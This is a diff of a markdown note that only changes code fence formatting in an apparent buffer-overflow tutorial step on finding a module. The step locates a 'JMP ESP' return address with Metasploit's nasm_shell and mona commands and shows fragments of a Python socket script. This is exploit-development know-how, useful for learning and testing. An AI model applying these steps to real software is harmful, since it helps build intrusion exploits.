@@ -1,20 +1,20 @@
 6-Finding the Right Module
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 Search NASM for “JMP ESP” (minus the quotes). (\xff\xe4)
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~cmd
 !mona modules
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~cmd
 !mona find -s "\xff\xe4" -m module.ext
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~python
 #!/usr/bin/python
 import sys, socket
 
@@ -32,4 +32,5 @@ except:
 	print "Error Connecting to Server..."
 	sys.exit()
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
+
